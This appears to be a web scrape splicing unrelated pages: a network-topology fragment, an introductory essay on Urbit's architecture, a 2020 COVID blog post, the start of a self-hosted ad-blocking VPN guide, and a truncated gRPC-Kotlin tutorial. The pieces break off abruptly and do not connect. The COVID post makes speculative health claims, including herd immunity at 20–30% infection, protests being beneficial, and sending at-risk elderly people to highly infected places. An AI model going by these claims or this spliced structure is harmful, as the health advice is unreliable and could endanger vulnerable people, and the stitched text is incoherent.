You might have encountered the formula for the number of links before:
n × (n – 1) / 2, with n being the number of nodes in the network.
As a consequence, this topology is impractical for larger networks.</p>

<h3 id="star-network">Star network</h3>

<p>The number of links can be reduced considerably by introducing a central node,
which forwards the communication between the other nodes.
In such a star-shaped network,
the number of links scales linearly with the number of nodes.
In other words,
if you double the number of nodes,
you also double the number of links.
In a fully connected network, you would have quadrupled the number …</p></article></div></div>

<p>it’s been a long time since my last post. in the intervening year i have remained very interested in urbit, completed the introductory hoon course, and began organizing a regional <a href="https://www.meetup.com/Urbit-DFW">meetup group</a>. i’ve also acquired a better technical understanding of the system design. i wrote this essay for our meetup group’s inaugural presentation; you can watch it on youtube <a href="https://www.youtube.com/watch?v=RI1TS0PWQAA">here</a>.</p>

<p>i’ve gotten pretty positive feedback from urbit novices about this, so i hope it’s helpful for anybody else who stumbles upon it. if you notice something that needs a correction, please reach out to me!</p>



<p>by <em>~sitful-hatred</em>; written for urbit dfw meetup 2020.1</p>

<h3 id="introduction">introduction</h3>

<p><a href="http://hyperstition.al/img/slides/slide1.png"><img src="http://hyperstition.al/img/slides/slide1.png#full-center" alt=""></a>urbit is a personal server. that is to say, it’s a computer acts as an agent on your behalf to talk to other computers on the internet. right now, we all use computers that belong to megacorporations and serve their interests; when you log into facebook and talk to your friend, all the real computation and storage is done on servers that belong to facebook. in a very real sense, they own your data. it’s very difficult to avoid at this point. the goal of urbit is to address the technical issues that led to this state of affairs, so that everybody can run and control their own software. there are a lot of projects that have tried to address one or two of the many problems that urbit tries to solve, but i doubt there is any other current project as ambitious or farsighted. urbit is an open source project primarily developed by a company called tlon, in san francisco, and there’s another company in austin also working full-time to develop it, called urbit.live.</p>

<p>urbit is famously difficult to describe; this is due to a combination of complexity, an opaque naming scheme, and its genuinely novel ideas and clever recombinations of old ones. it can seem like it leaked into our world from an alternate timeline. thinking about urbit requires you to modify a lot of conceptual models that you’re used to using to think about computers and the internet. i’m not any kind of expert on any on these subjects but i’ve spent a decent amount of time trying to digest the technical parts of urbit, and my goal here is to convey that understanding to you, and connect the technical decisions and constraints to the problems being solved. this presentation is aimed at someone who has heard of urbit but doesn’t quite get it yet. so, to begin, here is a list of questions:</p>

<p>what if your computer was deterministic – a minimal, strictly defined mathematical function that given an event sequence, always ended up in the same state? how would it be different from the computers we’re used to, and what advantages might it have? what would a network of these computers look like? what if that computation was standardized, so that an app i write today runs on another arbitrary computer in ten years, or the computer i’m using now still works when i pass it down to my kids?</p>

<p>why can’t i take my social graph with me when i leave facebook? why isn’t facebook just a protocol? why has the internet transformed from a peer-to-peer assemblage into a surveillance panopticon? why are we doing all our computation on some corporation’s mainframe as if it’s the 70’s, while they build dossiers on us? what happened to the dream of using networked computers to liberate individuals?</p>

<p>how do you grow social software to internet-scale without running into the obstacles produced by the conflicting values of different communities? how do we preserve the freedoms of association and speech while still allowing for the enforcement of values within groups? how do you disincentivize spam and bad actors in an open system?</p>

<p>as you may guess, some of the goals of urbit are to answer these questions and challenges in an elegant way. i will give you a cursory overview of the system and then talk more about the ideas it exists to implement.</p>

<p><a href="http://hyperstition.al/img/slides/slide2.png"><img src="http://hyperstition.al/img/slides/slide2.png#full-center" alt=""></a></p>

<h3 id="the-stack">the stack</h3>

<p>these problems are very difficult to address within the constraints of the current internet, but urbit is an entire networked computing stack from scratch. the core thesis of urbit is that all of these are technically solvable problems if you approach them at the right scale. i’ll try working from the bottom up here and give a cursory overview without getting too bogged down in details. i apologize if this is a little dense, but bear with me and it should cohere. the second half of this is less technical.</p>

<p><a href="http://hyperstition.al/img/slides/slide3.png"><img src="http://hyperstition.al/img/slides/slide3.png#full-center" alt=""></a></p>

<p>nock is a turing-complete function. you can think of it as the functional assembly code that underpins the entire urbit stack. its formal spec is typically described as “small enough to fit on a t-shirt”, and it has 12 opcodes, or basic instructions. this is a couple of orders of magnitude smaller than the x86_64 instruction set that your pc uses. nock is pared down to the minimum elements of what might make up a useful computer; for instance, it defines a single recursive datatype, a binary tree of integers; and its only arithmetic operator is increment.</p>

<p>but a combinator whose only arithmetic operator is increment sounds unusable as a computer; how do you subtract, for instance?</p>

<p>as you may know, if your computer can increment, you can derive all of the rest of the math you’d like out of that operation – for instance decrementing x by incrementing up to x-1. this is extremely inefficient, but urbit has a cool hack for this: the standard library has all the operations you would expect implemented as “jets”, written in optimized c, which manipulate values in a formally equivalent manner to a specification written in nock. that is to say, if you ran an incredibly slow version of your urbit without jets that did all its math the hard way but otherwise had the same inputs, its state would end up identical to the jetted version.</p>

<p><a href="http://hyperstition.al/img/slides/slide4.png"><img src="http://hyperstition.al/img/slides/slide4.png#full-center" alt=""></a></p>

<p>nock is virtualized with an interpreter programmed in c called vere. vere sits between your urbit and your computer, handing over keyboard and packet inputs to your urbit, and outputs back to your unix computer to be displayed in its terminal or sent off through its network interface. right now urbit runs as a unix process, but one can imagine urbit on hardware meant to run nock and jets directly. for now, vere is what runs your urbit on your macbook or vps.</p>

<p><a href="http://hyperstition.al/img/slides/slide5.png"><img src="http://hyperstition.al/img/slides/slide5.png#full-center" alt=""></a></p>

<p>hoon is the system programming language for the urbit operating system, arvo. hoon is a strongly-typed, functional higher-level language that compiles to nock; it’s effectively a collection of nock macros. expressions are denoted with ‘runes’, which are digraphs of ascii special characters. hoon code is made up of these expressions and as a result can be kind of scary to look at, but i promise it’s not as hard to use as you may think!</p>

<p><a href="http://hyperstition.al/img/slides/slide6.png"><img src="http://hyperstition.al/img/slides/slide6.png#full-center" alt=""></a></p>

<p>arvo is the urbit operating system. it has a minimal kernel, around 1000 lines of code, plus some kernel modules, called vanes. arvo’s vanes handle the networking, apps, a web server, a version-controlled file system, etc. your urbit instance’s arvo begins with a blank slate, then processes any events (packets and keystrokes), writes them to a log, and outputs its effects, producing new events and its new state. if you play back this log, your urbit will end up in an identical state.</p>

<p>urbit is deterministic. your urbit’s state is one giant binary tree that is modified by an event log. nock takes your state and some new event, applies the event to the state, and outputs a new state and a list of effects. arvo orchestrates events between vanes.</p>

<p><a href="http://hyperstition.al/img/slides/slide7.png"><img src="http://hyperstition.al/img/slides/slide7.png#full-center" alt=""></a></p>

<p>the urbit network protocol &amp; kernel module is called ames. ames is peer-to-peer and encrypted, and runs over udp. it has a global immutable namespace; an instance’s name is permanent, and is both an identity and routing address.
urbit’s address space is 128-bit, just like ipv6. the total number of addresses (or ‘ships’) is effectively unlimited. however, urbit’s address space is also partitioned into classes with different privileges. 8-bit address ships are called galaxies, which are core infrastructure nodes that sign software updates. underneath galaxies are stars, 16-bit address ships that act as routing infrastructure. beneath stars are planets, which are ships meant for individual humans. planet addresses are 32-bit like ipv4, so there’s about 4.2 billion of them. galaxies issue stars, and stars issue planets.</p>

<p>urbit uses a base-256 phonemic scheme for pronouncible numbers called @p. galaxies have single-syllable names like ~zod; stars are two-syllable, like ~marzod. planets have two two-syllable names, like ~dalsum-simreg. this is your identity – think of it as a combination ip &amp; email address. the words are human-memorable and sound like cool sci-fi names.</p>

<p><a href="http://hyperstition.al/img/slides/slide8.png"><img src="http://hyperstition.al/img/slides/slide8.png#full-center" alt=""></a></p>

<p>how do you own these names? urbit’s public key infrastructure is a set of ethereum contracts collectively called azimuth. azimuth acts as an ownership registry for ships and consensus mechanism for network governance. if you receive a ship, your proof of ownership is an erc-721 token, which is an ethereum standard for non-fungible tokens. you own this token like you own bitcoin; as long as you have the master password, it belongs to you forever.</p>

<p>azimuth technically exists outside of urbit as a general-purpose pki; urbit just uses it as a source of truth. if you dislike ethereum for political or technical reasons, keep in mind that it’s not a permanent intrinsic part of how urbit works, it’s just the current scheme – though in my opinion it’s a pretty elegant solution.</p>

<h3 id="philosophy">philosophy</h3>

<p>urbit has very strong opinions, and some design decisions that might not make immediate sense. this is a system meant to replace the internet we’ve spent half a century building; it needs some really compelling wins to be serious.</p>

<p>for instance, why make a computer with such a minimal core? so you can freeze it and standardize it.</p>

<p><a href="http://hyperstition.al/img/slides/slide9.png"><img src="http://hyperstition.al/img/slides/slide9.png#full-center" alt=""></a></p>

<p>a basic idea underlying the design of urbit is that many of the problems we have today with the way networked computers work is that the technologies composing them accrued in layers atop each other in ways that produce unforeseen conflicts. …</p></div></div>

				<div id="speakaboutWrapper"><p>Ok so this is not at all agreed upon. The CDC has<a href="https://www.cdc.gov/coronavirus/2019-ncov/covid-data/mathematical-modeling.html"> twenty-one different models</a> forecasting cases and deaths. Those forecasts are only shown on the CDC website to predict what will happen for about the next two weeks- until September 12th. The models are from various universities and teams- MIT has two models, Harvard has a model, Columbia University, Hopkins, Georgia Tech, Notre Dame, etc. etc. (the usual suspects). And even in that short time frame, they are all over the place.</p>



<p>Why are they all over the place? Well the biggest thing is that they make different assumptions about social distancing and behavior- it will continue as it is or change. Also some of them are assuming herd immunity, ahem, and some not. The Columbia-UNC model appears to assume herd immunity as it is predicting a decline in cases and not saying anything about social distancing (see below).</p>

That doesn’t tell us how this ends.</p>



<figure><blockquote><p>I actually have been in a pretty good mood lately because I think this ends soon and with less deaths than I originally thought. That doesn’t mean that this was in any way ok or a lot of people won’t have died. This was most definitely NOT ok, any of it. 220,000 people have already died- more than 6X the Flu. And this was preventable. So 100% not ok.</p></blockquote></figure><p>But here is what I think will happen. I think herd immunity is happening and I actually think that my original idea and<a href="https://www.bcg.com/en-us/publications/2020/protecting-vulnerable-populations-protects-all-populations"> the idea Boston Consulting Group’s (BCG) COVID-19 team was promoting</a>, actually naturally is occurring. I think the public health messaging got out there and the highest risk people are being more shielded than in the beginning of the pandemic. Whether that’s them being more careful or their families being more careful around them, the age of cases has dropped and thus the death rate is dropping. Proud of you America. Your government sucks but you are looking out for the vulnerable people on your own. </p>



<p>I actually think the protests were probably in some senses GOOD for this pandemic because the people protesting were by and large low-risk for dying of COVID. They were younger and probably most didn’t have a condition that put them at high risk- like asthma or cancer. Therefore the herd immunity we are seeing at 20-30% is a healthier 20-30% of the population. They are shielding the more vulnerable people from COVID with their immunity. That’s not to say anything about disparities- that’s a whole other can of worms that is terrible and I won’t get into here. </p>



<p>But bottom line? Cases are dropping and deaths are not as bad as we thought. Achieving herd immunity at 20-30% is huge! It is an unexpected and really lucky turn of events. I thought it would be at 60-70% and have a lot more deaths involved. </p>

<figure><blockquote><p>The herd immunity threshold depends on how responsible people are being. More mask wearing, more distancing, and more protecting of high-risk people will make herd immunity possible at lower levels. It will also save lives. So we need to keep doing this until the cases drop completely. </p></blockquote></figure><figure><img loading="lazy" width="1024" height="652" src="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png 1024w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-300x191.png 300w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-768x489.png 768w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1536x978.png 1536w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1200x764.png 1200w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-942x600.png 942w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-960x611.png 960w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1884x1200.png 1884w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior..png 2038w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>From UCSF grand rounds talk by Dr. Trevor Bedford.</figcaption></figure><p>I think it won’t be that much longer though. We need to hold on just a bit longer to save lives. I know it’s a lot to ask. <a href="https://www.nature.com/articles/d41586-020-02439-6?code=37bf7526-f76a-4c4e-9ed1-c9af8f9e72de&amp;error=cookies_not_supported">Depression rates have doubled and anxiety is through the roof</a>.<strong> </strong>And the economy is suffering.</p>



<p>But I think cases will have dropped enough and we will be immune enough for things to feel a lot more normal by Christmas. And a vaccine will be here in ~January 2021. The memorial day 2021 parties are going to be spectacular. This is what Wuhan province looks like- you know the place in China that originally locked down and then eradicated COVID. It’s off the hook there. Please someone start planning this pool party for me. Really- that looks amazing.</p>

For example, we could send the highest risk people to the places that are the most immune so they could be shielded. Like send grandma to New Orleans for the fall semester. </p>

But this hasn’t been possible during this thing because of the mass confusion, party in fighting, fake <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> news, and paternalism. So I have really no hope of them happening in the fall. I do think states that are not yet at 25% infection rates (herd immunity threshold) should not be opening schools- that’s just asking for disaster.

<p><img src="https://i.imgur.com/RfYeFgJm.png#center" alt=""></p>
<p>The goal of this guide is to enable you to safely and privately use the
Internet on your phones, tablets, and computers with a self-run VPN
Server in the cloud. It can be run at no cost to you; shields you from
intrusive advertisements; and blocks your ISP, cell phone company,
public WiFi hotspot provider, and apps/websites from gaining insight
into your usage activity.</p>
<p>Run your own privacy-first ad blocking service within the <strong><a href="https://cloud.google.com/free/">Free Usage Tier</a></strong> on Google Cloud. <strong>This guide gets you set up with a Google Cloud account, and walks you
through setting up a full tunnel (all traffic) or split tunnel (DNS
traffic only) VPN connection on your Android &amp; iOS devices, and
computers.</strong></p>
<p>Both Full Tunnel and Split Tunnel VPN connections provide DNS based
ad-blocking over an encrypted connection to the cloud. The differences
are:</p>
<ul>
<li>
<p>A Split Tunnel VPN allows you to interact with devices on your Local Network (such as a Chromecast or Roku).</p>
</li>
<li>
<p>A Full Tunnel VPN can help bypass misconfigured proxies on corporate WiFi networks, and protects you from Man-In-The-Middle SSL proxies.</p>
</li>
</ul>

        <p>In this blog post, we will explore how to use gRPC with Kotlin coroutines on both the server and client (Android) using the <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a> library.</p>

<h2 id="what-is-grpc">What is gRPC?</h2>

<p><a href="https://grpc.io/docs/what-is-grpc/introduction/">gRPC</a> is a framework by Google for making RPC requests. It allows you to call a method on the server as if it was a local method on the client. The server defines all the different types of RPC requests the client could make using protocol buffers. <a href="https://developers.google.com/protocol-buffers">Protocol buffers</a> is a data formatting language. It allows you to specify the request and response from rpc calls.</p>

<p>gRPC has support for clients and servers that are built using different programming languages.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-1.png" alt="client-server-diagram"></p>

<h2 id="use-case">Use Case</h2>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-2.png" alt="client-server-user-case"></p>

<p>Assume we are building an Android app that allows users to explore locations on map as they traverse from one location to another. The user may be able to check-in to a place or chat with others at the location. The user could also explore new venues such as restaurants and retail stores nearby. How could we build a server and client for this hypothetical use case?</p>


<h2 id="building-grpc-server">Building gRPC Server</h2>

<p>There are many open source libraries that could be used to build a gRPC server and client such as <a href="https://github.com/square/wire">Wire</a>, <a href="https://github.com/marcoferrer/kroto-plus">Kroto-Plus</a> and <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a>. Let’s explore how to use gRPC-Kotlin to build a gRPC server for our case.</p>

<h3 id="rpc-calls">RPC Calls</h3>

<p>The first step is to define the RPC calls a client could make. We’ll use protocol buffers to define the request and response. The RPC calls are defined in a file with an extension <code>.proto</code>. All RPC calls are defined in a service. The snippet below defines <code>VenueService</code> using the <a href="https://developers.google.com/protocol-buffers/docs/proto#services"><code>service</code></a> keyword. The proto file also specifies the version of protocol buffer to use. I have specified to use <a href="https://developers.google.com/protocol-buffers/docs/proto3">protocol buffer version 3</a>.</p>

<div><div><pre><code><span>syntax</span> <span>=</span> <span>"proto3"</span>

<span>service</span> <span>VenueService</span> <span>{</span>

<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call">Unary RPC Call</h4>

<p>The first RPC call type we will define is a simple client and server request. Suppose in our use case, we wanted to get a venue (restaurant, retail store) at a particular location. We could define this RPC call as follows.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>The <code>GetVenue</code> method takes in a <code>Location</code> message and returns a <code>Venue</code>.</p>

<div><div><pre><code><span>message</span> <span>Location</span> <span>{</span>
   <span>double</span> <span>latitude</span> <span>=</span> <span>1</span><span>;</span>
   <span>double</span> <span>longitude</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A type is defined using the <code>message</code> keyword. <code>Location</code> is a message that has two fields - latitude and longitude. These fields have a type of <code>double</code>. The <a href="https://developers.google.com/protocol-buffers/docs/proto#scalar">Protocol Buffer Guide</a> defines all the supported types such as enums or strings. Each field is assigned a unqiue number starting from 1. For each field defined subsequently, the unique number is incremented.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A <code>Venue</code> is represented as a message above. The name of the venue is a <code>string</code>. It references an existing message <code>Location</code> to return the latitude and longitude of the venue. The third field is an enum which represents the type of venue - landmark, driving range, restaurant or retail store. Each enum is specified with a unique number starting from 0. The last two fields checkins and reviews are int scalar types. In Kotlin, they map to a Long.</p>

<p>We have specified a simple unary RPC call that returns a venue based on a location.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<h4 id="server-streaming">Server Streaming</h4>

<p>The <code>GetVenue</code> RPC call above returns only one response. But, we could define RPC calls where the server returns a stream of data. Assume we wanted to define an RPC where the client gives a location and the server returns a stream of venues nearby.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-3.png" alt="server-side-streaming"></p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

    <span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We have added a server streaming RPC call to the service above. What’s new about this call specification? The return type <code>Venue</code> is marked with a <code>stream</code> keyword. This specifies that the returned data from the server will stream venues. The server will wait until the client send a message. Once it has a message, it will return a stream of responses.</p>

<h4 id="client-streaming">Client Streaming</h4>

<p>We saw in the server side streaming example that server was returning a stream of messages. The client only had sent one message. Client could also send a stream of messages.</p>

<p>Assume we wanted to return a summary of all the venues a person visted during their trip. For this use case, the client will have to send a stream of locations as they go from one location to another.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-4.png" alt="client-side-streaming"></p>

<p>In this diagram, the client is sending a stream of locations to the server. The server will wait until al the messages are received and send back a summary back to the client.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>The example above defines a <code>RecordTrip</code> rpc call that conforms to our use case. The <code>stream</code> keyword is used inside the parentheses to define the client side streaming RPC call.</p>

<h4 id="bidirectional-streaming">Bidirectional Streaming</h4>

<p>Both the client and server can be streaming messages. This use case is good for implementing a chat room. A client could stream messages sent by a user. The server could return replies from other users.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-5.png" alt="bidirectional-streaming"></p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>

<span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>

<span>}</span>

<span>message</span> <span>Comment</span> <span>{</span>
   <span>string</span> <span>text</span> <span>=</span> <span>1</span><span>;</span>
   <span>google.protobuf.Timestamp</span> <span>sentTime</span> <span>=</span> <span>3</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The rpc method <code>chat</code> takes a stream of comments and returns a replies. A comment is a message that has text and a timestamp for when it was sent. A <a href="https://developers.google.com/protocol-buffers/docs/reference/java/com/google/protobuf/Timestamp">Timestamp</a> is well known types in protocol buffers. In order to use it, you have to import the <a href="https://github.com/protocolbuffers/protobuf/blob/master/src/google/protobuf/timestamp.proto"><code>timestamp.proto</code></a> file.</p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>
</code></pre></div></div>

<p>In the rpc method, both request and response comments are marked with the <code>stream</code> keyword. The server could wait until comments are received in order to send all the replies. Or, the server could send a reply as it receives a comment. Its up to you how you want to implement the streaming logic.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>We’ve defined all the different types of RPC calls for our use case. How do we implement our logic to execute for the RPC calls?</p>

<h3 id="implementing-rpc-calls">Implementing RPC Calls</h3>

<p>When we run our build, the protocol buffer compiler will run. It will generates base implementation class for us from service.</p>

<div><div><pre><code><span>abstract</span> <span>class</span> <span>VenueServiceCoroutineImplBase</span><span>(</span><span>coroutineContext</span><span>)</span> <span>{</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span>

  <span>open</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span>

  <span>open</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span>

<span>}</span>
</code></pre></div></div>

<p>Each open method in the generated class above corresponds to an RPC call. In order to add our own logic when these methods are called, we will create a service that inherits this class.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>


<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call-1">Unary RPC Call</h4>

<p>Our unary RPC call took a location and returned a venue.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>return</span><span>s</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>This RPC call is implemented as a suspending method in our service.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span> <span>{</span>
        <span>return</span> <span>db</span><span>.</span><span>getVenue</span><span>(</span><span>request</span><span>)</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We could add logic to query a database to get a venue based on a location. The suspending method above returns a <code>Venue</code>. In our protocol buffer file, we had defined this as a message.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The protocol buffer compiler creates a builder for the <code>Venue</code> message. It has setters for each field defined above. We could map to this type using its builder.</p>

<div><div><pre><code><span>Venue</span><span>.</span><span>newBuilder</span><span>()</span>
  <span>.</span><span>setName</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setLocation</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setVenueType</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setCheckins</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>setReviews</span><span>(</span><span>..</span><span>.)</span>
  <span>.</span><span>build</span><span>()</span>
</code></pre></div></div>

<h4 id="server-streaming-1">Server Streaming</h4>

<div><div><pre><code><span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>
</code></pre></div></div>

<p>A server streaming RPC call was defined using the <code>listVenues</code> method that returns a stream of venues. This translates into method that returns a <a href="https://kotlin.github.io/kotlinx.coroutines/kotlinx-coroutines-core/kotlinx.coroutines.flow/-flow/">Flow</a> of <code>Venue</code>.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

  <span>override</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span> <span>{</span>
      <span>return</span> <span>db</span><span>.</span><span>getVenues</span><span>(</span><span>request</span><span>).</span><span>asFlow</span><span>()</span>
  <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We might have logic to query our database to get a list of venues nearby. The list return could be transformed into a <code>Flow</code> using the <code>asFlow</code> extension.</p>

<h4 id="client-streaming-1">Client Streaming</h4>

<p>A client streaming RPC call is also mapped to a <code>Flow</code>. But, the parameter of the generated is a Flow of requests.</p>

<div><div><pre><code><span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>This RPC method is translated as follows.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span> <span>{</span>
        <span>..</span><span>.</span>
    <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>In this generated method, the return type is a single message <code>TripSummary</code>. The request is a flow of locations.</p>

<h4 id="bidirectional-streaming-1">Bidirectional Streaming</h4>

<p>As we saw earlier, a bidirectional streaming call is a streaming responses and requests.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>

   <span>override</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span> <span>{</span>
        <span>..</span><span>.</span>
   <span>}</span>

<span>}</span>
